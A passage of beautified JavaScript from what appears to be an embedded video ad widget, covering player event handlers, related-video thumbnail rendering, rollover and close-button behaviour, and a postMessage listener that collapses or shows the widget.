    }), $sbPlayer(SbSocialWidget.playerId).onControlsLoaded(function () {
      try {
        var a = $sbPlayer(SbSocialWidget.playerId).getActiveConfig().currentVolume;
        "0" == a && SbSocialWidget.controlSoundOnVideo(!0, !1);
      } catch (a) {
        console.log("err: ", a);
      }
    }), $sbPlayer(SbSocialWidget.playerId).onMute(function () {
      SbSocialWidget.controlSoundOnVideo(!0, !1);
    }), $sbPlayer(SbSocialWidget.playerId).onUnmute(function () {
      SbSocialWidget.controlSoundOnVideo(!1, !1);
    }), $sbPlayer(SbSocialWidget.playerId).onAdvertisingBegin(function () {
      SbSocialWidget.jsonData.WidgetTeaser.catchAndRelease && SbSocialWidget.toggleCloseButton(!1);
    }), $sbPlayer(SbSocialWidget.playerId).onShowCollapsedPlayer(function (a) {
      SbSocialWidget.jsonData.WidgetTeaser.startCollapsed && SbSocialWidget.handleCollapse(a[0]);
    });
  },
  renderThumbs: function (a) {
    var b = "";
    return a.dimensions.showThumbsOnMouseOver ? b += '<div id="relatedSlideContainer" class="relatedVideosLandscape" style="background-color: black; position: absolute; z-index: 6; margin-top: 10px;"><div id="relatedContentScroll" class="relatedContentScrollLandscape" style="height: ' + a.dimensions.thumb_height + ';">' + this.renderThumbContent(a) + "</div>" + this.renderArrows(a) + "</div>" : ("landscape" == a.dimensions.widgetView && (b += '<div class="relatedVideosLandscape"><div id="relatedContentScroll" class="relatedContentScrollLandscape">' + this.renderThumbContent(a) + "</div>" + this.renderArrows(a) + "</div>"), "portrait" == a.dimensions.widgetView && (b += '<div class="relatedVideosPortrait">' + this.renderThumbContent(a) + "</div>")), b;
  },
  renderThumbContent: function (a) {
    var b = "",
      c = a.videosArray[0];
    return SbSocialWidget.each(a.videosArray, function (d, e) {
      var f = "margin-right: " + a.dimensions.thumb_space + "px;";
      "portrait" == a.dimensions.widgetView && (f = "" + (d % a.dimensions.thumb_num == 0 ? "" : "margin-left: 10px;") + (d > a.dimensions.thumb_num ? "margin-top: 10px;" : "")), ("landscape" == a.dimensions.widgetView || "portrait" == a.dimensions.widgetView && d < a.dimensions.thumb_num * a.dimensions.thumb_num_vertical) && (b += '<div id="' + d + '_related_video" title="' + e.title + '" class="related_video_box" style="' + f + '"><img src="' + e.thumb + '" alt="" border="" class="related_video_image" /><div id="' + d + '_now_playing" class="related_now_playing" style="' + (c.id == e.id ? "opacity: 1;" : "opacity: 0") + '">NOW PLAYING</div><div id="' + d + '_press_play" class="related_press_play" style="' + (c.id == e.id ? "opacity: 0;" : "opacity: 1") + '"></div><div id="' + d + '_press_play_image" class="related_press_play_image"></div></div>');
    }), b;
  },
  renderArrows: function (a) {
    var b = "";
    return a.videosArray.length > a.dimensions.thumb_num && (b += '<div id="relatedArrowLeftDiv" class="relatedArrowDivLandscape relatedArrowtDivLeftLandscape"><div id="relatedArrowLeft" class="relatedArrowLandscape relatedArrowLeftLandscape"></div></div><div id="relatedArrowRightDiv" class="relatedArrowDivLandscape relatedArrowtDivRightLandscape"><div id="relatedArrowRight" class="relatedArrowLandscape relatedArrowRightLandscape"></div></div>'), b;
  },
  showThumbsOnRolloverEvents: function () {
    var a = setInterval(function () {
      var b = document.getElementById("syndicatedMainDiv");
      b && (clearInterval(a), SbSocialWidget.bindEvent(SbSocialWidget.unitDiv, "mouseenter", SbSocialWidget.sbSyndiMouseEnter), SbSocialWidget.bindEvent(SbSocialWidget.unitDiv, "mouseleave", SbSocialWidget.sbSyndiMouseLeave));
    });
  },
  sbSyndiMouseEnter: function () {
    return !SbSocialWidget.sbThumbsShowing && (SbSocialWidget.sbThumbsShowing = !0, void setTimeout(SbSocialWidget.sbTimeoutCheckFunctionEnter, 500));
  },
  sbSyndiMouseLeave: function () {
    return !!SbSocialWidget.sbThumbsShowing && (SbSocialWidget.sbThumbsShowing = !1, void setTimeout(SbSocialWidget.sbTimeoutCheckFunctionLeave, 500));
  },
  sbTimeoutCheckFunctionEnter: function () {
    if (SbSocialWidget.sbThumbsShowing) {
      var a = document.getElementById("relatedSlideContainer");
      a.style.marginTop = "-" + SbSocialWidget.jsonData.dimensions.thumb_height + "px";
    }
  },
  sbTimeoutCheckFunctionLeave: function () {
    if (!SbSocialWidget.sbThumbsShowing) {
      var a = document.getElementById("relatedSlideContainer");
      a.style.marginTop = "10px";
    }
  },
  toggleCloseButton: function (a) {
    var b = SbSocialWidget.unitDiv.style.position;
    a ? ("fixed" == b && (document.getElementById("sb-close-btn").style.opacity = 1, document.getElementById("sb-close-btn").style.right = "0px"), SbSocialWidget.contentPlayed = !0) : (document.getElementById("sb-close-btn").style.opacity = 0, document.getElementById("sb-close-btn").style.right = "-18px", SbSocialWidget.contentPlayed = !1);
  },
  controlSoundOnVideo: function (a, b) {
    try {
      a ? (b && $sbPlayer(SbSocialWidget.playerId).mute(), document.getElementById("sbVideoMute").style.visibility = "hidden", document.getElementById("sbVideoUnmute").style.visibility = "visible") : (b && $sbPlayer(SbSocialWidget.playerId).unmute(), document.getElementById("sbVideoMute").style.visibility = "visible", document.getElementById("sbVideoUnmute").style.visibility = "hidden");
    } catch (a) {}
  },
  handleCollapse: function (a) {
    var b = SbSocialWidget.unitDiv.style.position;
    a ? (SbSocialWidget.unitDiv.style.height = SbSocialWidget.options.height + "px", "fixed" != b ? (SbSocialWidget.unitDiv.style.left = "0px", SbSocialWidget.xPos = SbSocialWidget.posX()) : SbSocialWidget.posX() < 0 && (SbSocialWidget.unitDiv.style.left = SbSocialWidget.posX() + 1e4 + "px")) : "-10000px" == SbSocialWidget.unitDiv.style.left && (SbSocialWidget.unitDiv.style.height = "0px");
  },
  playClickedVideo: function (a) {
    $sbPlayer(SbSocialWidget.playerId).play(parseInt(a) + 1);
  }
};
window.addEventListener("mousemove", runDiscoveryJob);
respondToPostMessage = function (a) {
  if ("object" == typeof a.data) return !1;
  var b = document.getElementById("social_widget");
  if (!b) return !1;
  var c = b.style.position;
  if (a.data.indexOf("showCollapsed") != -1) {
    var d = a.data.split("|");
    "true" == d[1] ? (b.style.height = SbSocialWidget.options.height + "px", "fixed" != c ? (b.style.left = "0px", SbSocialWidget.xPos = SbSocialWidget.posX()) : SbSocialWidget.posX() < 0 && (b.style.left = SbSocialWidget.posX() + 1e4 + "px")) : "-10000px" == b.style.left && (b.style.height = "0px");
  }
  if (a.data.indexOf("syndiTvShowCloseButton") != -1) {
    var d = a.data.split("|");
    "true" == d[1] ? ("fixed" == c && (document.getElementById("sb-close-btn").style.opacity = 1, document.getElementById("sb-close-btn").style.right = "0px"), SbSocialWidget.contentPlayed = !0) : (document.getElementById("sb-close-btn").style.opacity = 0, document.getElementById("sb-close-btn").style.right = "-18px", SbSocialWidget.contentPlayed = !1);
  }
}, window.addEventListener ? window.addEventListener("message", respondToPostMessage, !1) : window.attachEvent("onmessage", respondToPostMessage);